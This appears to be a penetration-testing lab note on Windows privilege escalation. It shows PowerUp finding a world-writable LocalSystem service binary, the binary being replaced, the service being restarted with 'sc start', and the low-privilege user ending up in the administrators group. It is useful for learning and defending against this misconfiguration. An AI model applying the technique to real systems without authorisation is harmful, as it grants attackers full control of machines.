
This is similar to the [[Registry#^VulnService|Vulnerable registry service]] attack. Instead of adding an `ImagePath`, in this case there is already an executable available on the disk. The easiest way to find such services is using `PowerUp`.

```PowerShell
.
.
[*] Checking service executable and argument permissions...


ServiceName                     : filepermsvc
Path                            : "C:\Program Files\File Permissions Service\filepermservice.exe"
ModifiableFile                  : C:\Program Files\File Permissions Service\filepermservice.exe
ModifiableFilePermissions       : {ReadAttributes, ReadControl, Execute/Travers
                                  e, DeleteChild...}
ModifiableFileIdentityReference : Everyone
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'filepermsvc'
CanRestart                      : True
.
.
```

It identifies that there is a file that can be modified by anyone (`ModifiableFileIdentityReference`) at `C:\Program Files\File Permissions Service\filepermservice.exe`.

We can simply overwrite this file with an [[Registry#^Executable|executable]] that will add a user to the administrators group and start the service.

```PowerShell
C:\Users\user>net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

------------------------------------------------------------------
Administrator
TCM
The command completed successfully.


C:\Users\user>sc start filepermsvc

SERVICE_NAME: filepermsvc
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 3452
        FLAGS              :

C:\Users\user>net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

------------------------------------------------------------------
Administrator
TCM
user
The command completed successfully.
```

